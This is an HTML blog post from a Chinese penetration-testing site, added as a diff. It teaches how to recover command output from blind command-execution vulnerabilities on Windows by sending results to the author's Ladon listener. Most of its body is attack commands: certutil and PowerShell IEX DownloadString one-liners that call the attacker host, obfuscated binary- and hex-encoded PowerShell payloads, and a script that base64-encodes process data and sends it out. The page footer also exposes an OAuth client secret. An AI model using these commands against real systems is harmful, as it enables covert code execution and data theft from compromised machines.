@@ -1,0 +1,392 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="命令执行">
+
+
+<meta name="description" content="前言
+很多时候命令回显漏洞由于一些特殊原因，无法构造或不方便构造回显，上回讲到JAVA反序列化漏洞Ladon回显方法。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certut...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    无回显命令执行漏洞之PowerShell回显 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="无回显命令执行漏洞之PowerShell回显">
+            
+            无回显命令执行漏洞之PowerShell回显
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/05/01</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1448</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h3 id="前言">前言</h3>
+<p>很多时候命令回显漏洞由于一些特殊原因，无法构造或不方便构造回显，上回讲到JAVA反序列化漏洞Ladon回显方法。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certutil或Powershell命令，虽说JAVA跨平台但并不代表所有系统都预装有JAVA，实际上.NET一样是跨平台的，前提都要系统安装才可以，那么对于未安装JAVA的机器或非JAVA程序产生的命令执行漏洞，如何实现命令回显，将是本文讲述的重点。JAVA篇：<a href="http://k8gege.org/Ladon/web_javarce.html">http://k8gege.org/Ladon/web_javarce.html</a></p>
+<h3 id="启动WEB">启动WEB</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon web 800</span><br></pre></td></tr></tbody></table></figure>
+<p>PS: 建议使用8.1以后版本，以免netstat -an等长度过长结果无法接收</p>
+<h4 id="参数">参数</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ip.txt or ip.jpg        Get Target WanIP</span><br><span class="line">/getstr/AnyString        Get Request String</span><br><span class="line">/getb64/AnyString        Base64 Encode (Request String)</span><br><span class="line">/deb64/Base64String      Base64 Decode (Request String)</span><br><span class="line">/deb64txt/Base64String      Base64 Decode Save TXT</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="浏览器回显">浏览器回显</h3>
+<p>由于是HTTP协议，可以通过浏览器访问得到Ladon回显BASE64解密结果，就是说我们只要通过命令行发送HTTP请求即可在Ladon控制台看到命令执行后的结果。getstr为发送明文，但是结果中有特殊字符或换行就无法HTTP请求了，所以我们使用BASE64加密，这个原理我们在JAVA反序列化漏洞回显中有提到过。</p>
+<h4 id="明文回显">明文回显</h4>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.43:800/getstr/cve2020">http://192.168.1.43:800/getstr/cve2020</a></p>
+<h4 id="Base64回显">Base64回显</h4>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=</a></p>
+<h4 id="保存txt">保存txt</h4>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=</a><br>
+<a target="_blank" rel="noopener" href="http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=</a></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Ladon8.1_web_echo.PNG"></p>
+<h3 id="certutill回显">certutill回显</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://192.168.1.43:800/getstr/cve2020</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="PowerShell回显">PowerShell回显</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=')"</span></span><br></pre></td></tr></tbody></table></figure>
+<p>执行以上命令，可以在Ladon中得到回显，但是实战中，我们不可能未补先知，直接能返回结果，所以得先执行命令，获取结果转成BASE64后再发送给Ladon解密，所以我们接下来要研究，如何通过powershell执行任意命令并加密发送给Ladon</p>
+<h3 id="查看进程例子">查看进程例子</h3>
+<h4 id="test-ps1">test.ps1</h4>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span>=<span class="built_in">get-process</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$info</span>;</span><br></pre></td></tr></tbody></table></figure>
+<p>使用LadonGUI版的编码转换功能将代码转成一行CMD命令，因为命令执行漏洞一般不支持执行多行PS1脚本，经过转换后可以得到命令执行漏洞通用的一行CMD命令。测试发现可以使用Binary或hex等加密将PowerShell代码转成一条命令，以便结合漏洞使用</p>
+<h4 id="Ladon-Base64Command失败">Ladon Base64Command失败</h4>
+<p>提示 =get-process : The term ‘=get-process’ is not recognized as the name of a</p>
+<h4 id="Ladon-Binary成功">Ladon Binary成功</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  -NoP  -NonIntera   <span class="string">"[stRinG]::join( '', ( ( 100100 , 1101001,1101110 , 1100110 ,1101111 , 111101 ,1100111,1100101, 1110100, 101101,1110000,1110010 ,1101111, 1100011,1100101,1110011,1110011 , 111011,1101 ,1010,1100101, 1100011,1101000 ,1101111 ,100000,100100,1101001 , 1101110 ,1100110 ,1101111 ,111011)|fOreAcH-objEct{([convERT]::ToInT16((<span class="variable">$_</span>.TOstRInG()),2) -as [CHAr])}) )| &amp; ((VaRIABle '*MDr*').nAme[3,11,2]-JoIn'')"</span></span><br></pre></td></tr></tbody></table></figure>
+<h4 id="Ladon-hex成功">Ladon hex成功</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell   -NonInteract  -NoProfi     <span class="string">"('24S69k6e!66!6f!3dU67!65h74-2dS70S72O6f;63O65k73S73;3b;d!a-65-63!68;6f!20k24h69;6ek66h6fU3b'.sPLIt( 'UOh-;!kS' ) | FOreaCh-objECt{ ( [chAR]( [cONVerT]::TOInt16( ( [STRinG]<span class="variable">$_</span> ) ,16))) } ) -JOiN '' | . ( <span class="variable">$eNv</span>:comSPeC[4,15,25]-JoiN'')"</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="查看进程信息">查看进程信息</h3>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span>=<span class="built_in">get-process</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$env:username</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$info</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bytes</span>  = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$info</span>)</span><br><span class="line"><span class="variable">$b64</span> = [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b64</span>.Replace(<span class="string">"="</span>,<span class="string">"%3d"</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$webClient</span> = <span class="built_in">New-Object</span> System.Net.WebClient</span><br><span class="line"><span class="variable">$webClient</span>.DownloadString(<span class="string">'http://192.168.1.18:800/debase64/'</span>+<span class="variable">$b64</span>)</span><br></pre></td></tr></tbody></table></figure>
+<p>PS：查看其它命令，可以自行修改</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Ladon8.1_ps1_hex.PNG"></p>
+<h3 id="Download">Download</h3>
+<h4 id="LadonGo-ALL-OS">LadonGo (ALL OS)</h4>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo/releases">https://github.com/k8gege/LadonGo/releases</a></p>
+<h4 id="Ladon-Windows-Cobalt-Strike">Ladon (Windows &amp; Cobalt Strike)</h4>
+<p>历史版本: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>
+7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+8.1版本：K8小密圈</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/wmiexec2.html" class="pre-post btn btn-default" title="〖教程〗Ladon WmiExec完美兼容Cobalt Strike">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖教程〗Ladon WmiExec完美兼容Cobalt Strike</span>
+    </a>
+    
+    
+    <a href="/p/cve-2018-14847.html" class="next-post btn btn-default" title="〖EXP〗CVE-2018-14847 RouterOS Exploit">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖EXP〗CVE-2018-14847 RouterOS Exploit</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8WEB"><span class="toc-text">启动WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-text">参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9B%9E%E6%98%BE"><span class="toc-text">浏览器回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E5%9B%9E%E6%98%BE"><span class="toc-text">明文回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64%E5%9B%9E%E6%98%BE"><span class="toc-text">Base64回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98txt"><span class="toc-text">保存txt</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#certutill%E5%9B%9E%E6%98%BE"><span class="toc-text">certutill回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell%E5%9B%9E%E6%98%BE"><span class="toc-text">PowerShell回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E4%BE%8B%E5%AD%90"><span class="toc-text">查看进程例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#test-ps1"><span class="toc-text">test.ps1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon-Base64Command%E5%A4%B1%E8%B4%A5"><span class="toc-text">Ladon Base64Command失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon-Binary%E6%88%90%E5%8A%9F"><span class="toc-text">Ladon Binary成功</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon-hex%E6%88%90%E5%8A%9F"><span class="toc-text">Ladon hex成功</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">查看进程信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Download"><span class="toc-text">Download</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LadonGo-ALL-OS"><span class="toc-text">LadonGo (ALL OS)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon-Windows-Cobalt-Strike"><span class="toc-text">Ladon (Windows &amp; Cobalt Strike)</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
